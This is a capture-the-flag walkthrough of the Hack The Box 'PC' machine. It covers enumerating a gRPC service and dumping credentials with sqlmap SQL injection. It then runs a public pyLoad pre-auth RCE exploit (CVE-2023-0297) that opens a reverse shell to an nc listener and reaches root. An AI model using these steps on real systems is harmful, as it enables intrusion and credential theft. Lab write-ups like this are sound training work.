---
layout: default
title: PC
description: HTB - PC
---

## Enumeration

Nmap:
```
Nmap scan report for 10.10.11.214
Host is up (0.055s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
50051/tcp open  unknown
```
Ok, 2 ports open, one unknown. Let's search it up and find out what's what.

![image](https://raw.githubusercontent.com/TudM99/tudm99.github.io/main/images/pc_01.png)

So gRPC. Good, we now have something we can look into.

Another search for gRPC pentesting, brings out “grpcui”. (https://github.com/fullstorydev/grpcui)

Let's clone and use it.
```
# /root/go/bin/grpcui -plaintext 10.10.11.214:50051
gRPC Web UI available at http://127.0.0.1:34621/
```
![image](https://raw.githubusercontent.com/TudM99/tudm99.github.io/main/images/pc_02.png)

We'll now attempt to register a user, using the “RegisterUser” function, and check the output.

![image](https://raw.githubusercontent.com/TudM99/tudm99.github.io/main/images/pc_03.png)

Great! Our account appears to have been created. Let's try logging in.

![image](https://raw.githubusercontent.com/TudM99/tudm99.github.io/main/images/pc_04.png)

We now have a token, which we can input in this field, and use the “getInfo” function:

![token](https://raw.githubusercontent.com/TudM99/tudm99.github.io/main/images/pc_05.png)
![token](https://raw.githubusercontent.com/TudM99/tudm99.github.io/main/images/pc_06.png)

Response for the “getInfo” function:

![getinfo](https://raw.githubusercontent.com/TudM99/tudm99.github.io/main/images/pc_07.png)

We didn't get much info, so let's try seeing the request in burp.

We'll start burp in proxy mode, capture the request, and send it to repeater to check if we can alter it in some way.

![burp](https://raw.githubusercontent.com/TudM99/tudm99.github.io/main/images/pc_08.png)

I tried inputing different values (1, 0, etc) no output was given, I tried a php payload out of desperation, still didn't work.

I then figured out that the “id” parameter must be stored in a database. So I saved the request and threw it in sqlmap.

If you set the value of “id” to “***” ("id":"***"), sqlmap will know where to look.
```
sqlmap -r pcsql --dump-all --batch
```
BINGO!
```
Database: <current>
Table: accounts
[2 entries]
+------------------------+----------+
| password               | username |
+------------------------+----------+
| admin                  | admin    |
| [REDACTED] | sau      |
+------------------------+----------+

```
## Exploitation

And now let's ssh into the machine with the username “sau”.
```
ssh sau@10.10.11.214                                     
sau@10.10.11.214's password: 
Last login: Sat Sep 23 19:02:07 2023 from 10.10.11.214
bash-5.0$ 
bash-5.0$ ls
user.txt
bash-5.0$ cat user.txt
0c31efdfbc024f[REDACTED]
bash-5.0$ 
```

Let's snoop around in the usual places. /home, /opt, and run linpeas for good measure.
```
bash-5.0$ cd /opt
bash-5.0$ ls -la
total 12
drwxr-xr-x  3 root root 4096 Jan 11  2023 .
drwxr-xr-x 21 root root 4096 Apr 27 15:23 ..
drwxr-xr-x  3 root root 4096 Sep 23 19:14 app
bash-5.0$ cd app
bash-5.0$ ls
__pycache__  app.py      app_pb2_grpc.py  sqlite.db
app.proto    app_pb2.py  middle.py
bash-5.0$ cd /home
bash-5.0$ ls
sau
bash-5.0$ cd sau
bash-5.0$ ls
user.txt
```

Linpeas found a local connection, like we had on “Internal” from THM.

Let's create an SSH tunnel like we did there, and try to access it.
```
ssh -N -L 5555:127.0.0.1:8000 sau@10.10.11.214
sau@10.10.11.214's password: 
```
And we are met by a pyLoad login page:

![pyload](https://raw.githubusercontent.com/TudM99/tudm99.github.io/main/images/pc_09.png)

## Privilege Escalation

Previous credentials didn't work, so I started googling for possible exploits.

As luck would have it, I found a pre-auth RCE exploit -> CVE-2023-0297 

Let's download and launch it.

First, I'll set up a listener, and then run the exploit.

```
nc -lvnp 9002
Listening on 0.0.0.0 9002

python3 preauth.py -t 127.0.0.1:5555 -I 10.10.14.232 -P 9002 
[SUCCESS] Running reverse shell. Check your listener!

Connection received on 10.10.11.214 51996
bash: cannot set terminal process group (1059): Inappropriate ioctl for device
bash: no job control in this shell
root@pc:~/.pyload/data# 
root@pc:~/.pyload/data# id  
id
uid=0(root) gid=0(root) groups=0(root)

```

We have root! We can now read the “/root/root.txt” file, and submit our flags.

Good hunting o7

[Try it out yourself!](https://app.hackthebox.com/machines/PC) 

[back](./)
